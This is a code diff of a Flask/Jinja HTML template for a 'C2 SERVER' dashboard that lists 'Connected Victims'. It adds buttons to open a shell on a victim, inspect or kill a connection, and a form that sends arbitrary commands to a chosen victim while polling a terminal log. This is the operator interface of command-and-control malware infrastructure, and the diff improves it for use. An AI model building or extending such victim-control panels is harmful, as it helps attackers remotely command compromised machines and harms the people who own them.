@@ -3,9 +3,8 @@
 <head>
   <meta charset="UTF-8">
   <title>C2 SERVER</title>
-  <link 
-    href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" 
-    rel="stylesheet">
+  <link href="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/css/bootstrap.min.css" rel="stylesheet">
+  <link rel="stylesheet" href="{{ url_for('static', filename='css/main.css') }}">
   <style>
     @keyframes fadeInUp {
       0% { opacity: 0; transform: translateY(20px); }
@@ -29,6 +28,7 @@
       padding: 10px;
       white-space: pre-wrap;
       border: 1px solid #555;
+      border-radius: 0.5rem;
     }
   </style>
 </head>
@@ -40,91 +40,109 @@
   </nav>
 
   <main class="container my-4">
-    <h2 class="text-center mb-4">Connected Victims</h2>
+    <div class="fade-in">
+      <h2 class="text-center mb-4">Connected Victims</h2>
 
-    {% with messages = get_flashed_messages() %}
-      {% if messages %}
-        <div class="alert alert-info">
-          {% for msg in messages %}
-            {{ msg }}<br>
-          {% endfor %}
-        </div>
-      {% endif %}
-    {% endwith %}
+      {% with messages = get_flashed_messages() %}
+        {% if messages %}
+          <div class="alert alert-info">
+            {% for msg in messages %}
+              {{ msg }}<br>
+            {% endfor %}
+          </div>
+        {% endif %}
+      {% endwith %}
 
-    {% if clients %}
-      <table class="table table-striped">
-        <thead>
-          <tr>
-            <th>Client ID</th>
-            <th>User Info</th>
-            <th>Actions</th>
-          </tr>
-        </thead>
-        <tbody>
-        {% for c in clients %}
-          <tr>
-              <td>{{ c.client_id }}</td>
-              <td><pre class="mb-0">{{ c.userinfo }}</pre></td>
-              <td>
-                <div class="d-flex gap-2">
-                  {% if not c.shell_active %}
-                    <!-- Show "Shell" button if NO shell yet -->
-                    <form action="{{ url_for('obtain_shell', client_id=c.client_id) }}" method="post">
-                      <button class="btn btn-primary">Shell</button>
-                    </form>
-                  {% else %}
-                    <!-- Shell is active: hide button or show text -->
-                    <span class="text-muted">Shell Active</span>
-                  {% endif %}
-
-                  <!-- The rest of your buttons remain unchanged -->
-                  <form action="{{ url_for('victim_detail', client_id=c.client_id) }}" method="get">
-                    <button class="btn btn-secondary">Details</button>
-                  </form>
-                  <form action="{{ url_for('kill_connection', client_id=c.client_id) }}" method="post">
-                    <button class="btn btn-danger">Kill</button>
-                  </form>
-                </div>
-              </td>
-          </tr>
-        {% endfor %}
-  </tbody>
-      </table>
-
-      <div class="row mt-5">
-        <div class="col-md-5">
-          <h4>Send Command</h4>
-          <form id="cmdForm" onsubmit="sendAjaxCommand(event)">
-            <div class="mb-3">
-              <label for="client-select" class="form-label">Select Client:</label>
-              <select id="client-select" class="form-select">
+      {% if clients %}
+        <div class="card shadow mb-4">
+          <div class="card-body">
+            <div class="table-responsive">
+              <table class="table table-striped align-middle mb-0">
+                <thead class="table-light">
+                  <tr>
+                    <th>Client ID</th>
+                    <th>User Info</th>
+                    <th>Actions</th>
+                  </tr>
+                </thead>
+                <tbody>
                 {% for c in clients %}
-                <option value="{{ c.client_id }}">Client {{ c.client_id }}</option>
+                  <tr>
+                    <td>{{ c.client_id }}</td>
+                    <td><pre class="mb-0">{{ c.userinfo }}</pre></td>
+                    <td>
+                      <div class="d-flex gap-2 flex-wrap">
+                        {% if not c.shell_active %}
+                          <form action="{{ url_for('obtain_shell', client_id=c.client_id) }}" method="post">
+                            <button class="btn btn-primary btn-sm">Shell</button>
+                          </form>
+                        {% else %}
+                          <span class="text-muted">Shell Active</span>
+                        {% endif %}
+                        <form action="{{ url_for('victim_detail', client_id=c.client_id) }}" method="get">
+                          <button class="btn btn-secondary btn-sm">Details</button>
+                        </form>
+                        <form action="{{ url_for('kill_connection', client_id=c.client_id) }}" method="post">
+                          <button class="btn btn-danger btn-sm">Kill</button>
+                        </form>
+                      </div>
+                    </td>
+                  </tr>
                 {% endfor %}
-              </select>
+                </tbody>
+              </table>
             </div>
-          </form>
+          </div>
         </div>
-        <div class="col-md-7">
-          <h4>Terminal Log</h4>
-          <div id="terminal"></div>
+
+        <div class="row mt-5 g-4">
+          <div class="col-md-5">
+            <div class="card h-100">
+              <div class="card-body">
+                <h4 class="card-title">Send Command</h4>
+                <form id="cmdForm" onsubmit="sendAjaxCommand(event)">
+                  <div class="mb-3">
+                    <label for="client-select" class="form-label">Select Client:</label>
+                    <select id="client-select" class="form-select">
+                      {% for c in clients %}
+                        <option value="{{ c.client_id }}">Client {{ c.client_id }}</option>
+                      {% endfor %}
+                    </select>
+                  </div>
+                  <div class="mb-3">
+                    <input type="text" id="commandInput" class="form-control" placeholder="Enter command...">
+                  </div>
+                  <button type="submit" class="btn btn-primary w-100">Send</button>
+                </form>
+              </div>
+            </div>
+          </div>
+          <div class="col-md-7">
+            <div class="card h-100">
+              <div class="card-body">
+                <h4 class="card-title">Terminal Log</h4>
+                <div id="terminal"></div>
+              </div>
+            </div>
+          </div>
         </div>
-      </div>
-    {% else %}
-      <div class="alert alert-warning text-center">No victims connected.</div>
-    {% endif %}
+      {% else %}
+        <div class="alert alert-warning text-center">No victims connected.</div>
+      {% endif %}
+    </div>
   </main>
 
+  <footer class="bg-dark text-light text-center py-3 mt-auto">
+    <small>&copy; {{ 2024 }} C2 Server</small>
+  </footer>
+  <script src="https://cdn.jsdelivr.net/npm/bootstrap@5.3.0/dist/js/bootstrap.bundle.min.js"></script>
   <script>
     let userScrolling = false;
     const terminalDiv = document.getElementById("terminal");
-
     terminalDiv.addEventListener("scroll", () => {
       const threshold = 50;
       userScrolling = terminalDiv.scrollTop + terminalDiv.clientHeight < terminalDiv.scrollHeight - threshold;
     });
-
     function fetchTerminal() {
       const clientId = document.getElementById("client-select")?.value;
       if (!clientId) return;
@@ -136,8 +154,75 @@
         })
         .catch(err => console.error("Error fetching log:", err));
     }
-
     setInterval(fetchTerminal, 2000);
+    // Command send logic
+    const cmdInput = document.getElementById("commandInput");
+    const sendBtn = document.querySelector("#cmdForm button[type='submit']");
+    let shellReady = false;
+    // Add a waiting message
+    const waitingMsg = document.createElement('div');
+    waitingMsg.className = 'alert alert-info my-2';
+    waitingMsg.textContent = 'Waiting for shell to be ready...';
+    cmdInput.disabled = true;
+    sendBtn.disabled = true;
+    cmdInput.parentElement.parentElement.insertBefore(waitingMsg, cmdInput.parentElement);
+
+    function checkShellReady(clientId) {
+      fetch('/api/shell_ready/' + clientId)
+        .then(r => r.json())
+        .then(data => {
+          if (data.ready) {
+            shellReady = true;
+            cmdInput.disabled = false;
+            sendBtn.disabled = false;
+            if (waitingMsg.parentElement) waitingMsg.remove();
+          } else {
+            shellReady = false;
+            cmdInput.disabled = true;
+            sendBtn.disabled = true;
+            if (!waitingMsg.parentElement) {
+              cmdInput.parentElement.parentElement.insertBefore(waitingMsg, cmdInput.parentElement);
+            }
+            setTimeout(() => checkShellReady(clientId), 500);
+          }
+        });
+    }
+    // Initial check
+    let lastCheckedClient = document.getElementById("client-select").value;
+    checkShellReady(lastCheckedClient);
+    // Update check when client changes
+    document.getElementById("client-select").addEventListener("change", function() {
+      lastCheckedClient = this.value;
+      shellReady = false;
+      cmdInput.disabled = true;
+      sendBtn.disabled = true;
+      if (!waitingMsg.parentElement) {
+        cmdInput.parentElement.parentElement.insertBefore(waitingMsg, cmdInput.parentElement);
+      }
+      checkShellReady(lastCheckedClient);
+    });
+    function sendAjaxCommand(e) {
+      e.preventDefault();
+      const clientId = document.getElementById("client-select")?.value;
+      const cmdInput = document.getElementById("commandInput");
+      let cmd = cmdInput.value.trim();
+      if (!cmd || !clientId || !shellReady) return;
+      cmdInput.value = "";
+      // For demo, just log. In real app, send to backend.
+      const formData = new FormData();
+      formData.append("client_id", clientId);
+      formData.append("command", cmd);
+      fetch("/api/send_command", {
+        method: "POST",
+        body: formData
+      })
+      .then(response => response.json())
+      .then(data => {
+        // Optionally show feedback: alert(data.result) or show in UI
+        fetchTerminal();
+      })
+      .catch(err => console.error("Error sending command:", err));
+    }
   </script>
 </body>
 </html>
